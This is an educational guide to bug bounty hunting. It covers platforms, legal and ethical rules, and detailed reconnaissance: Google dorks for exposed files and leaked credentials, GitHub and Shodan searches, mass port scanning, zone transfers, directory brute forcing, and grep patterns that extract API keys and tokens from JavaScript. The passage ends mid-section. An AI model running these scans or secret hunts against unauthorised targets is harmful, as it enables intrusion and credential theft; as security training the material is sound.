# 💰 Bug Bounty Hunting

## Complete Professional Guide to Finding Real Vulnerabilities for Rewards

---

## Table of Contents

1. [Introduction to Bug Bounty](#introduction-to-bug-bounty)
2. [Bug Bounty Platforms](#bug-bounty-platforms)
3. [Legal & Ethical Framework](#legal--ethical-framework)
4. [Reconnaissance Methodology](#reconnaissance-methodology)
5. [Subdomain Enumeration](#subdomain-enumeration)
6. [Content Discovery](#content-discovery)
7. [Technology Fingerprinting](#technology-fingerprinting)
8. [Vulnerability Classes](#vulnerability-classes)
9. [API Security Testing](#api-security-testing)
10. [Authentication & Authorization Bugs](#authentication--authorization-bugs)
11. [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
12. [Race Conditions](#race-conditions)
13. [Subdomain Takeover](#subdomain-takeover)
14. [Report Writing](#report-writing)
15. [Automation & Tooling](#automation--tooling)
16. [Advanced Techniques](#advanced-techniques)
17. [Case Studies](#case-studies)
18. [Income Strategies](#income-strategies)
19. [Labs & Exercises](#labs--exercises)
20. [Interview Questions](#interview-questions)

---

## Introduction to Bug Bounty

### What is Bug Bounty Hunting?

Bug bounty hunting is the practice of finding security vulnerabilities in organizations' systems and responsibly disclosing them in exchange for monetary rewards. Companies run bug bounty programs because:

1. **Cost efficiency** — Paying per vulnerability is cheaper than hiring full-time researchers for every possible attack vector
2. **Diverse perspectives** — Thousands of researchers with different skill sets test simultaneously, approaching problems from different angles
3. **Continuous testing** — Programs run 24/7/365, unlike annual penetration tests
4. **Real-world results** — Researchers use the same techniques as real attackers
5. **Scalability** — Access to global talent pool without employment overhead

### Bug Bounty vs Penetration Testing

| Aspect | Bug Bounty | Penetration Test |
|--------|-----------|-----------------|
| Scope | Usually limited (specific assets) | Defined scope (entire network/app) |
| Duration | Ongoing (months/years) | Time-boxed (1-4 weeks) |
| Payment | Per vulnerability found | Fixed fee regardless of findings |
| Methodology | Hunter's choice | Structured methodology (PTES, OWASP) |
| Report | Per-bug report | Comprehensive final report |
| Relationship | Transactional | Engagement-based |
| Legal protection | Platform's safe harbor | Contract/SOW |
| Skill level | All levels | Usually experienced professionals |
| Competition | Many researchers on same target | Exclusive engagement |
| Depth | Varies per researcher | Thorough, systematic |

### How Bug Bounty Programs Work - Internal Architecture

```
┌────────────────────────────────────────────────────────────────┐
│                    BUG BOUNTY ECOSYSTEM                         │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌──────────┐    ┌──────────────┐    ┌───────────────────┐   │
│  │Researcher│───►│   Platform   │───►│  Company Security │   │
│  │ (Hacker) │    │  (HackerOne/ │    │      Team         │   │
│  └──────────┘    │  Bugcrowd)   │    └───────────────────┘   │
│       │          └──────────────┘            │                │
│       │                │                     │                │
│       ▼                ▼                     ▼                │
│  ┌──────────┐    ┌──────────────┐    ┌───────────────────┐   │
│  │  Finds   │    │   Triager    │    │   Validates &     │   │
│  │   Bug    │    │  (Reviews)   │    │   Patches Bug     │   │
│  └──────────┘    └──────────────┘    └───────────────────┘   │
│       │                │                     │                │
│       ▼                ▼                     ▼                │
│  ┌──────────┐    ┌──────────────┐    ┌───────────────────┐   │
│  │ Submits  │    │  Assigns     │    │   Determines      │   │
│  │ Report   │    │  Severity    │    │   Bounty Amount   │   │
│  └──────────┘    └──────────────┘    └───────────────────┘   │
│                                              │                │
│                                              ▼                │
│                                    ┌───────────────────┐     │
│                                    │  Payment to       │     │
│                                    │  Researcher       │     │
│                                    └───────────────────┘     │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### Typical Reward Structure

| Severity | CVSS Score | Typical Payout | Examples |
|----------|-----------|---------------|----------|
| Critical | 9.0-10.0 | $5,000-$100,000+ | RCE, Auth bypass to admin, SQLi with full DB access, SSRF to cloud credentials |
| High | 7.0-8.9 | $2,000-$20,000 | Stored XSS on admin panel, SSRF to internal services, account takeover |
| Medium | 4.0-6.9 | $500-$5,000 | CSRF on sensitive actions, IDOR on user data, privilege escalation |
| Low | 0.1-3.9 | $100-$1,000 | Reflected XSS, information disclosure, open redirect |
| Informational | N/A | $0-$100 | Best practice violations, no direct impact |

### Report Lifecycle

```
Submitted → Triaged → Validated → Remediation → Resolved → Disclosed

States explained:
- New: Report just submitted
- Triaged: Platform confirmed it's valid, sent to company
- Needs More Info: Company/triager asks for clarification
- Duplicate: Someone reported this before you
- Informational: Valid finding but no security impact
- Not Applicable: Not a vulnerability / out of scope
- Resolved: Company fixed it, bounty awarded
- Disclosed: Report made public (optional)

Average timelines:
- Triage: 1-7 days
- Validation: 7-30 days
- Fix: 30-90 days
- Payment: Upon resolution (some pay on triage)
- Disclosure: 30-90 days after fix
```

---

## Bug Bounty Platforms

### HackerOne - Deep Dive

```
Overview:
- Largest platform (500,000+ registered hackers)
- Most Fortune 500 programs
- Signal & Impact reputation system
- Mediation for disputes
- Clear Response SLAs
- Payments via PayPal, bank transfer, Bitcoin

Reputation System:
- Signal: Quality metric (-10 to 7)
  - Valid bugs increase signal
  - Invalid/spam reports decrease signal
  - High signal = private program invitations
  
- Impact: Average severity of accepted reports
  - Higher impact = access to better programs
  
- Reputation: Composite score
  - Affects ranking on leaderboard
  - Unlocks private program invitations
  - Required minimum for some programs

How to maintain high reputation:
1. Only report confirmed vulnerabilities
2. Write detailed, clear reports
3. Don't report informational/low-impact
4. Respond quickly to triager questions
5. Don't argue with Duplicate decisions unnecessarily
6. Focus quality over quantity

Private vs Public Programs:
- Public: Anyone can participate, more competition
- Private: Invitation only, fewer researchers, higher payouts
- Getting invited: High signal + relevant skills + program interest
```

### Bugcrowd - Deep Dive

```
Overview:
- Vulnerability Rating Taxonomy (VRT) standardizes severity
- Bug Bash events (time-limited, higher payouts)
- Crowd-sourced penetration testing (paid by hour)
- More startup/SMB programs

Unique Features:
- VRT: Standardized severity → consistent payouts
- Kudos: Reputation system
- On-demand testing: Hourly paid engagements
- Researcher ranking by category
- Monthly leaderboards

Differences from HackerOne:
- Generally fewer participants per program
- VRT sometimes limits payout flexibility
- Good for mobile security focus
- Better for beginners (less competition on some programs)
```

### Intigriti - Deep Dive

```
Overview:
- European-focused platform (GDPR-compliant)
- Growing rapidly
- Monthly bug bounty challenges (educational)
- Strong community (Discord)

Advantages:
- Less competition than HackerOne/Bugcrowd
- European companies often have wider scope
- Good for EU timezone researchers
- Educational challenges monthly
- Active community support
```

### Direct Programs (No Platform)

```
Major companies with direct programs:
- Google: bughunters.google.com (up to $31,337 for Chrome, $150,000+ for Android)
- Microsoft: msrc.microsoft.com/bounty (up to $250,000 for Hyper-V)
- Apple: developer.apple.com/security-bounty (up to $2,000,000)
- Meta: facebook.com/whitehat (minimum $500)
- GitHub: bounty.github.com
- Mozilla: bugzilla.mozilla.org/buglist.cgi
- Intel: hackerone.com/intel (hybrid)

Pros of direct programs:
- Often higher payouts
- Direct communication with security team
- No platform commission
- Some have wider scope

Cons:
- Less legal protection (no safe harbor intermediary)
- Slower response times sometimes
- No mediation if disputes arise
- Payment processing varies
```

---

## Legal & Ethical Framework

### Safe Harbor Provisions - Understanding Your Legal Protection

```
CRITICAL: Always check the program's safe harbor language!

What safe harbor protects:
- Computer Fraud and Abuse Act (CFAA) claims
- Digital Millennium Copyright Act (DMCA) claims
- Terms of Service violations (within testing scope)
- Similar international laws (EU Computer Misuse Act, etc.)

What safe harbor does NOT protect:
- Testing out-of-scope assets (you WILL be vulnerable to prosecution)
- Accessing/storing personal data beyond minimal PoC
- Social engineering employees (unless explicitly allowed)
- Physical security testing (locks, facilities)
- Denial of Service testing (almost never allowed)
- Data destruction or modification
- Pivoting to connected systems without authorization
- Third-party systems (even if accessible through target)

Real-world legal risks:
- Accessing a database and downloading ALL records (even to prove impact)
- Running automated scanners that cause service degradation
- Testing government systems without explicit authorization
- Disclosing before company patches (even after unreasonable delays)
```

### Responsible Disclosure vs Full Disclosure

```
Responsible Disclosure (most common):
1. Find vulnerability
2. Report to vendor privately
3. Give vendor time to fix (usually 90 days)
4. Vendor patches
5. Coordinated public disclosure

Full Disclosure (controversial):
1. Find vulnerability
2. Publish publicly immediately
3. No vendor notification first

Arguments for Full Disclosure:
- Forces fast patches
- Informs users of risk immediately
- Vendors sometimes ignore private reports

Arguments against:
- Exposes users before patch available
- May be illegal in some jurisdictions
- Burns relationship with vendor
- Ethically questionable

Bug bounty standard: Always responsible disclosure
- Report through platform
- Follow platform's disclosure timeline
- Don't disclose without company approval
- If company is unresponsive, platform mediates
```

### Rules of Engagement - Detailed Breakdown

```
ALWAYS:
✅ Read the ENTIRE program policy before testing
✅ Stay within defined scope boundaries
✅ Stop immediately if you access real user data
✅ Report findings promptly (within 24 hours of discovery)
✅ Delete any data you accessed during testing
✅ Use your own test accounts when possible
✅ Respect rate limits and service availability
✅ Document everything (timestamps, screenshots, requests)
✅ Use non-destructive testing methods
✅ Communicate professionally in all interactions

NEVER:
❌ Test out-of-scope assets (even if you "accidentally" find them)
❌ Perform DoS/DDoS attacks
❌ Access more data than needed for proof of concept
❌ Modify or delete any data
❌ Use automated scanners without explicit permission
❌ Publicly disclose before authorization
❌ Sell vulnerabilities to third parties (black market)
❌ Use vulnerabilities for personal gain beyond bounty
❌ Social engineer employees (phishing, vishing)
❌ Physical intrusion attempts
❌ Chain with out-of-scope systems for impact
❌ Test during maintenance windows (may cause confusion)
❌ Use found credentials to access systems beyond PoC
❌ Share unpublished vulnerabilities with other researchers
```

---

## Reconnaissance Methodology

### The Philosophy of Reconnaissance

```
"Give me six hours to chop down a tree, and I will spend the first
four sharpening the axe." - attributed to Abraham Lincoln

In bug bounty:
- 80% of your time should be reconnaissance
- 20% exploitation
- Most researchers spend too little time on recon
- The more you know about the target, the more bugs you find
- Automated recon catches low-hanging fruit
- Manual recon finds unique attack surfaces

Recon is NOT just subdomain enumeration.
Recon is understanding EVERYTHING about the target:
- Technology stack
- Business logic
- Development practices
- Deployment infrastructure
- Third-party integrations
- Historical changes
- Developer habits
- Internal architecture (as much as legally discoverable)
```

### Reconnaissance Phases - Complete Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                    COMPLETE RECON WORKFLOW                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PHASE 1: PASSIVE RECONNAISSANCE (No direct contact)            │
│  ├── Company OSINT (acquisitions, tech blog, job postings)      │
│  ├── Subdomain enumeration (passive sources only)               │
│  ├── Certificate transparency logs                              │
│  ├── DNS records analysis                                       │
│  ├── Historical data (Wayback Machine, Common Crawl)            │
│  ├── GitHub/GitLab organization scanning                        │
│  ├── Leaked credentials (breach databases - viewing only)       │
│  ├── Social media (developer posts about tech decisions)        │
│  ├── ASN/IP range identification                                │
│  ├── Shodan/Censys reconnaissance                               │
│  └── Job posting analysis (reveals tech stack)                  │
│                                                                 │
│  PHASE 2: SEMI-PASSIVE RECONNAISSANCE                           │
│  ├── DNS zone transfer attempts                                 │
│  ├── Reverse DNS lookups                                        │
│  ├── Reverse IP lookups (shared hosting)                        │
│  ├── WHOIS data analysis                                        │
│  ├── Email header analysis                                      │
│  └── SPF/DKIM/DMARC record analysis                           │
│                                                                 │
│  PHASE 3: ACTIVE RECONNAISSANCE (Direct interaction)            │
│  ├── DNS brute forcing                                          │
│  ├── Port scanning                                              │
│  ├── Content discovery (directory/file brute force)             │
│  ├── Virtual host discovery                                     │
│  ├── Parameter discovery                                        │
│  ├── JavaScript analysis (endpoints, secrets)                   │
│  ├── Spider/crawl the application                               │
│  ├── API documentation discovery                                │
│  ├── Technology fingerprinting (detailed)                       │
│  └── Error message analysis                                     │
│                                                                 │
│  PHASE 4: VULNERABILITY DISCOVERY                               │
│  ├── Automated scanning (nuclei, nikto)                         │
│  ├── Manual testing of discovered endpoints                     │
│  ├── Logic flow analysis                                        │
│  ├── Authentication/authorization testing                       │
│  ├── Input validation testing                                   │
│  ├── Business logic testing                                     │
│  └── Third-party integration testing                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### OSINT (Open Source Intelligence) Gathering

```bash
# ═══════════════════════════════════════════════════════
# COMPANY INTELLIGENCE
# ═══════════════════════════════════════════════════════

# Job postings reveal technology stack
# LinkedIn jobs → search for target company
# Indeed, Glassdoor → technical requirements
# Example findings:
# "Experience with React, Node.js, PostgreSQL, AWS"
# → Now you know their stack!

# Acquisitions reveal additional attack surface
# Check: Crunchbase, Wikipedia, news articles
# Acquired companies may still run old infrastructure
# Often integrated poorly → security gaps

# Developer blog posts
# Medium, dev.to, company engineering blog
# Reveal: Architecture decisions, tools used, challenges faced

# ═══════════════════════════════════════════════════════
# GOOGLE DORKS (Advanced Search Operators)
# ═══════════════════════════════════════════════════════

# Find all indexed pages
site:target.com

# Find login pages
site:target.com inurl:login OR inurl:signin OR inurl:admin

# Find file upload functionality
site:target.com inurl:upload OR inurl:attach

# Find API documentation
site:target.com inurl:api OR inurl:swagger OR inurl:docs

# Find configuration files
site:target.com filetype:xml OR filetype:json OR filetype:yaml OR filetype:conf

# Find documents that may contain sensitive information
site:target.com filetype:pdf OR filetype:doc OR filetype:xlsx

# Find backup files
site:target.com filetype:bak OR filetype:old OR filetype:backup

# Find exposed databases
site:target.com filetype:sql OR filetype:db OR filetype:sqlite

# Find error messages / debug info
site:target.com "error" OR "exception" OR "stack trace" OR "debug"

# Find admin panels
site:target.com inurl:admin OR inurl:panel OR inurl:dashboard OR inurl:manage

# Find exposed .git directories
site:target.com inurl:".git"

# Find subdomains via Google
site:*.target.com -www

# Find S3 buckets
site:s3.amazonaws.com "target"
site:target.com.s3.amazonaws.com

# Find internal URLs in indexed pages
site:target.com inurl:internal OR inurl:staging OR inurl:dev OR inurl:test

# Find login credentials in pastes
"target.com" site:pastebin.com
"target.com" site:paste.mozilla.org
"target.com" site:gist.github.com

# ═══════════════════════════════════════════════════════
# GITHUB RECONNAISSANCE
# ═══════════════════════════════════════════════════════

# Search organization repos for secrets
# GitHub search: org:target "api_key" OR "secret" OR "password"
# GitHub search: org:target filename:.env
# GitHub search: org:target filename:config extension:json
# GitHub search: "target.com" password OR secret OR key

# Tool: truffleHog (search git history for secrets)
trufflehog git https://github.com/target-org/repo.git

# Tool: gitleaks (find secrets in repos)
gitleaks detect --source /path/to/repo

# Tool: gitrob (find sensitive files in org repos)
gitrob analyze target-org

# What to look for in repos:
# - .env files (API keys, database credentials)
# - Configuration files with hardcoded secrets
# - Internal URLs and IP addresses
# - Development/staging server addresses
# - AWS keys, private SSH keys
# - Database connection strings
# - JWT secrets
# - OAuth client secrets
# - Webhook URLs with tokens
# - Infrastructure-as-code (reveals architecture)

# ═══════════════════════════════════════════════════════
# SHODAN / CENSYS RECONNAISSANCE
# ═══════════════════════════════════════════════════════

# Shodan queries
hostname:target.com                      # All services on target
ssl.cert.subject.cn:target.com          # All SSL certs
http.title:"target"                      # HTTP servers with target in title
org:"Target Company Inc"                 # All IPs belonging to org
asn:AS12345                             # All IPs in their ASN
ssl.cert.issuer.cn:"target.com" 200     # Self-signed certs (internal services!)

# What Shodan reveals:
# - Open ports and services
# - Software versions (often outdated!)
# - SSL certificate details
# - HTTP response headers
# - Banner information
# - Cloud provider (AWS, GCP, Azure)
# - Geographic location
# - Operating system
# - Potential vulnerabilities (vulns facet)

# Censys.io (similar to Shodan, different data)
# services.tls.certificates.leaf.names: target.com
# services.http.response.body: "target.com"
```

### ASN and IP Range Discovery

```bash
# Find the company's ASN (Autonomous System Number)
# ASN = range of IP addresses allocated to an organization

# Method 1: WHOIS
whois -h whois.radb.net -- '-i origin AS12345' | grep route

# Method 2: bgp.he.net (Hurricane Electric)
# Search company name → find ASN → find all IP ranges

# Method 3: Using amass
amass intel -org "Target Company"
amass intel -asn 12345

# Why ASN matters:
# - Reveals ALL IP ranges owned by company
# - May find services not linked to known domains
# - Can discover forgotten/legacy infrastructure
# - Reveals hosting providers used
# - Shows geographic distribution

# Port scan entire ASN range (use carefully, may be noisy)
# Only scan if program scope allows IP-based testing
masscan -p1-65535 --rate 1000 -iL company_ips.txt -oG masscan_results.txt
```

---

## Subdomain Enumeration

### Why Subdomain Enumeration is Critical

```
Main website (www.target.com):
- Heavily tested by everyone
- Well-maintained
- WAF protected
- Few bugs remaining

Forgotten subdomain (old-staging.target.com):
- Nobody tests it
- Running outdated software
- No WAF
- Default credentials
- Full of vulnerabilities

Finding subdomains = Finding attack surface that others miss
```

### Passive Subdomain Discovery - Complete Methodology

```bash
# ═══════════════════════════════════════════════════════
# TOOL 1: subfinder
# ═══════════════════════════════════════════════════════
# Purpose: Fast passive subdomain enumeration
# Sources: VirusTotal, Shodan, Censys, SecurityTrails, etc.
# Speed: Very fast (seconds to minutes)

subfinder -d target.com -o subs_subfinder.txt -all -silent
# Flags:
# -d: Target domain
# -o: Output file
# -all: Use ALL available sources (slower, more results)
# -silent: Only output subdomains (no banners)
# -recursive: Find subdomains of subdomains
# -config: Custom config with API keys for premium sources

# Configure API keys for better results (~/.config/subfinder/provider-config.yaml):
# securitytrails: [YOUR_API_KEY]
# shodan: [YOUR_API_KEY]
# virustotal: [YOUR_API_KEY]
# chaos: [YOUR_API_KEY]
# This dramatically increases results (10x more subdomains)

# ═══════════════════════════════════════════════════════
# TOOL 2: amass (OWASP Project)
# ═══════════════════════════════════════════════════════
# Purpose: Most comprehensive subdomain tool
# Sources: 50+ data sources, DNS brute force, permutations
# Speed: Slower but more thorough

# Passive only (no direct DNS queries to target)
amass enum -passive -d target.com -o subs_amass.txt

# Active enumeration (includes brute force)
amass enum -active -d target.com -brute -w /path/to/wordlist -o subs_amass_active.txt

# Full enum with all techniques
amass enum -d target.com -active -brute -src -ip -dir amass_output/
# -src: Show source of each subdomain
# -ip: Show resolved IP addresses
# -dir: Output directory for all data

# Amass tracking (monitor changes over time)
amass track -d target.com -dir amass_output/

# ═══════════════════════════════════════════════════════
# TOOL 3: assetfinder
# ═══════════════════════════════════════════════════════
# Purpose: Quick and simple subdomain finder
# Speed: Very fast

assetfinder --subs-only target.com > subs_assetfinder.txt

# ═══════════════════════════════════════════════════════
# TOOL 4: findomain (Rust-based, fast)
# ═══════════════════════════════════════════════════════
findomain -t target.com -q > subs_findomain.txt

# ═══════════════════════════════════════════════════════
# CERTIFICATE TRANSPARENCY LOGS
# ═══════════════════════════════════════════════════════
# CT logs record ALL SSL certificates issued
# This reveals subdomains that have/had SSL certificates
# Even internal services that were briefly exposed!

# crt.sh query
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | \
  sed 's/\*\.//g' | \
  sort -u > subs_crt.txt

# Why CT logs are powerful:
# - Reveals subdomains that may no longer resolve
# - Shows internal service names (dev, staging, internal)
# - Historical data (old subdomains that may be revived)
# - Cannot be hidden (certificates must be logged by CA policy)

# ═══════════════════════════════════════════════════════
# COMBINING ALL RESULTS
# ═══════════════════════════════════════════════════════
cat subs_subfinder.txt subs_amass.txt subs_assetfinder.txt \
    subs_findomain.txt subs_crt.txt | \
  sort -u > all_subdomains.txt

echo "[+] Total unique subdomains: $(wc -l < all_subdomains.txt)"
```

### Active Subdomain Discovery

```bash
# ═══════════════════════════════════════════════════════
# DNS BRUTE FORCING
# ═══════════════════════════════════════════════════════

# Prepare resolvers (trusted DNS servers for resolution)
# Don't use just 8.8.8.8 — it rate limits
# Use a list of reliable public resolvers
# Tool: dnsvalidator (finds working resolvers)
dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o resolvers.txt

# Brute force with puredns
puredns bruteforce \
  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  target.com \
  -r resolvers.txt \
  -w brute_subs.txt \
  --wildcard-batch 1000000

# Explanation:
# - Uses massdns for fast resolution
# - Automatically detects and handles wildcard DNS records
# - Wildcard: *.target.com resolves to same IP → false positives
# - puredns filters these out automatically

# ═══════════════════════════════════════════════════════
# RESOLVE ALL FOUND SUBDOMAINS
# ═══════════════════════════════════════════════════════

# Combine passive + brute force results
cat all_subdomains.txt brute_subs.txt | sort -u > combined_subs.txt

# Resolve (check which actually exist in DNS)
puredns resolve combined_subs.txt \
  -r resolvers.txt \
  -w resolved.txt \
  --skip-sanitize

echo "[+] Resolved subdomains: $(wc -l < resolved.txt)"

# ═══════════════════════════════════════════════════════
# HTTP PROBING (find web servers)
# ═══════════════════════════════════════════════════════

# httpx: Fast HTTP toolkit
httpx -l resolved.txt \
  -o alive_full.txt \
  -status-code \
  -content-length \
  -title \
  -tech-detect \
  -follow-redirects \
  -threads 50 \
  -timeout 10 \
  -no-color

# Extract just URLs for further testing
cat alive_full.txt | awk '{print $1}' > alive_urls.txt

# ═══════════════════════════════════════════════════════
# SUBDOMAIN PERMUTATION & ALTERATION
# ═══════════════════════════════════════════════════════

# If you found: api.target.com
# Try permutations: api-v2, api-staging, api-dev, api-internal, api-test

# Tool: gotator
gotator -sub resolved.txt \
  -perm /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt \
  -depth 1 \
  -numbers 3 \
  -mindup -adl | \
  puredns resolve -r resolvers.txt > permutation_subs.txt

# Tool: altdns
altdns -i resolved.txt -o permuted.txt \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
puredns resolve permuted.txt -r resolvers.txt -w altdns_resolved.txt

# Common permutation patterns:
# {word}-{sub}.target.com
# {sub}-{word}.target.com
# {word}.{sub}.target.com
# {sub}{word}.target.com
# {sub}-{number}.target.com
```

### DNS Record Analysis for Bug Bounty

```bash
# ═══════════════════════════════════════════════════════
# COMPREHENSIVE DNS ANALYSIS
# ═══════════════════════════════════════════════════════

# Mass DNS record enumeration
cat resolved.txt | dnsx -a -aaaa -cname -mx -txt -ns -resp -o dns_full.txt

# CNAME records → Potential subdomain takeover
cat resolved.txt | dnsx -cname -resp-only | sort -u > cname_records.txt
# If CNAME points to: *.herokuapp.com, *.azurewebsites.net, etc.
# AND the target service is unclaimed → TAKEOVER!

# TXT records → May contain secrets
cat resolved.txt | dnsx -txt -resp-only | sort -u > txt_records.txt
# Look for: verification tokens, SPF records, DKIM keys
# Sometimes contain: API keys, internal hostnames

# MX records → Email infrastructure
cat resolved.txt | dnsx -mx -resp-only | sort -u > mx_records.txt
# Reveals email providers (G Suite, Exchange, etc.)

# A records → IP mapping
cat resolved.txt | dnsx -a -resp-only | sort -u > ip_addresses.txt
# Group by IP → multiple subdomains on same server
# Reveal cloud providers (AWS, GCP, Azure IP ranges)

# Reverse DNS → Find other domains on same IP
cat ip_addresses.txt | while read ip; do
  host "$ip" | grep "domain name pointer"
done > reverse_dns.txt

# Zone transfer attempt (usually fails, but try!)
dig axfr target.com @ns1.target.com
# If successful → you have ALL DNS records (goldmine!)
# Always try this — very few servers still allow it,
# but when they do, it's comprehensive subdomain list
```

---

## Content Discovery

### Directory and File Brute Forcing - Complete Methodology

```bash
# ═══════════════════════════════════════════════════════
# FFUF (Fuzz Faster U Fool) - Comprehensive Usage
# ═══════════════════════════════════════════════════════

# Basic directory discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,301,302,403 \
  -t 50 \
  -o results.json \
  -of json

# Flags explained:
# -u: URL with FUZZ keyword (placeholder for wordlist entries)
# -w: Wordlist path
# -mc: Match HTTP status codes (show only these)
# -fc: Filter codes (hide these)
# -fs: Filter by response size (remove false positives)
# -fw: Filter by word count
# -fl: Filter by line count
# -t: Threads (concurrent requests)
# -o: Output file
# -of: Output format (json, csv, md, html)
# -r: Follow redirects
# -recursion: Recurse into found directories
# -e: Extensions to append

# File discovery with multiple extensions
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.txt,.bak,.old,.conf,.env,.yaml,.yml,.log,.sql,.zip,.tar.gz \
  -mc 200,301,302 \
  -t 50

# Recursive directory discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -recursion \
  -recursion-depth 3 \
  -mc 200,301,302

# Handling custom 404 pages (most important technique!)
# Step 1: Determine the "default" 404 response
curl -s https://target.com/thispagedoesnotexist12345 | wc -c
# Let's say it returns 1234 bytes

# Step 2: Filter by that size
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc all \
  -fs 1234
# -mc all: Show all status codes
# -fs 1234: Filter (hide) responses of 1234 bytes (the custom 404)

# Virtual host discovery (find hidden sites on same server)
ffuf -u https://target.com \
  -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200 \
  -fs 1234

# Parameter discovery (find hidden parameters)
ffuf -u "https://target.com/page?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 \
  -fs baseline_size

# POST parameter fuzzing
ffuf -u https://target.com/api/endpoint \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"FUZZ":"test"}' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200

# ═══════════════════════════════════════════════════════
# IMPORTANT WORDLISTS FOR BUG BOUNTY
# ═══════════════════════════════════════════════════════

# SecLists (Daniel Miessler) - Essential collection
# /Discovery/Web-Content/
#   raft-large-directories.txt  (115,000+ directories)
#   raft-large-files.txt        (115,000+ filenames)
#   common.txt                  (4,600 common paths)
#   big.txt                     (20,000+ paths)
#   directory-list-2.3-medium.txt (220,000+ paths)

# /Discovery/DNS/
#   subdomains-top1million-110000.txt (subdomain brute force)
#   dns-Jhaddix.txt (comprehensive DNS wordlist)

# Custom wordlist from target (HIGHLY EFFECTIVE)
# Extract words from the application itself:
cewl https://target.com -d 3 -w custom_wordlist.txt
# This creates a wordlist from the website's actual content
# Then use it for directory/file brute forcing
# Often finds paths that generic wordlists miss!
```

### Historical Data Mining

```bash
# ═══════════════════════════════════════════════════════
# WAYBACK MACHINE & URL ARCHIVES
# ═══════════════════════════════════════════════════════

# Tool: waybackurls
echo "target.com" | waybackurls > wayback_urls.txt
# Retrieves ALL URLs ever archived for the domain
# Can reveal: old endpoints, deprecated APIs, removed pages

# Tool: gau (Get All URLs)
# Combines: Wayback Machine, Common Crawl, OTX AlienVault, URLScan
gau target.com --threads 5 --subs > gau_urls.txt
# --subs: Include subdomains

# Tool: katana (modern web crawler + JS parsing)
katana -u https://target.com -d 3 -o katana_urls.txt -js-crawl -known-files all
# -d: Depth of crawling
# -js-crawl: Parse JavaScript for URLs
# -known-files: Check for known sensitive files

# Combine all URL sources
cat wayback_urls.txt gau_urls.txt katana_urls.txt | sort -u > all_urls.txt

# ═══════════════════════════════════════════════════════
# FILTERING URLS FOR INTERESTING TARGETS
# ═══════════════════════════════════════════════════════

# URLs with parameters (potential injection points)
cat all_urls.txt | grep -E "\?" | sort -u > parameterized_urls.txt

# JavaScript files (secrets, endpoints)
cat all_urls.txt | grep -iE "\.js(\?|$)" | sort -u > js_files.txt

# API endpoints
cat all_urls.txt | grep -iE "(api|graphql|rest|v[0-9])" | sort -u > api_endpoints.txt

# Potentially sensitive files
cat all_urls.txt | grep -iE "\.(env|config|conf|json|yaml|yml|xml|sql|bak|old|backup|log|txt)" | sort -u > sensitive_files.txt

# Admin/internal pages
cat all_urls.txt | grep -iE "(admin|internal|dashboard|manage|panel|portal)" | sort -u > admin_pages.txt

# File upload endpoints
cat all_urls.txt | grep -iE "(upload|import|attach|file)" | sort -u > upload_endpoints.txt

# Login/auth endpoints
cat all_urls.txt | grep -iE "(login|signin|auth|register|signup|reset|forgot)" | sort -u > auth_endpoints.txt

# Check which historical URLs are still alive
httpx -l parameterized_urls.txt -mc 200 -o alive_params.txt -threads 50 -silent
```

### JavaScript Analysis - Deep Dive

```bash
# ═══════════════════════════════════════════════════════
# WHY JAVASCRIPT ANALYSIS IS CRITICAL
# ═══════════════════════════════════════════════════════
# 
# Modern web applications are heavily JavaScript-based.
# JavaScript files contain:
# - Hidden API endpoints not in documentation
# - API keys and secrets (accidentally bundled)
# - Internal service URLs
# - Business logic (can be reverse engineered)
# - Authentication flows
# - Feature flags
# - Debug endpoints
# - Admin functionality
# - WebSocket endpoints
# - GraphQL queries/mutations
# - Third-party service integrations

# ═══════════════════════════════════════════════════════
# COLLECT AND DOWNLOAD JS FILES
# ═══════════════════════════════════════════════════════

# Find JS files from multiple sources
cat all_urls.txt | grep -iE "\.js(\?|$)" | sort -u > all_js_urls.txt
httpx -l all_js_urls.txt -mc 200 -silent > alive_js.txt

# Download all JavaScript files
mkdir -p js_analysis
while IFS= read -r url; do
  filename=$(echo "$url" | md5sum | cut -d' ' -f1).js
  curl -sL "$url" -o "js_analysis/$filename"
  echo "$url → $filename" >> js_analysis/url_map.txt
done < alive_js.txt

# ═══════════════════════════════════════════════════════
# EXTRACT INFORMATION FROM JS FILES
# ═══════════════════════════════════════════════════════

# Tool: LinkFinder (find endpoints in JS)
python3 linkfinder.py -i https://target.com/main.js -o cli
# Also works on entire domain:
python3 linkfinder.py -i https://target.com -d -o results.html

# Tool: SecretFinder (find secrets/keys in JS)
python3 SecretFinder.py -i https://target.com/main.js -o cli

# Manual regex patterns for secrets:
# AWS Keys
grep -rhoP "AKIA[0-9A-Z]{16}" js_analysis/
# Google API Key
grep -rhoP "AIza[0-9A-Za-z\\-_]{35}" js_analysis/
# Generic API key patterns
grep -rhoP "(api[_-]?key|apikey|secret|token|password|auth)['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]" js_analysis/
# URLs and endpoints
grep -rhoP "https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}[/a-zA-Z0-9_.?&=-]*" js_analysis/ | sort -u
# Internal paths
grep -rhoP "(/api/[a-zA-Z0-9_/]+)" js_analysis/ | sort -u
# Email addresses
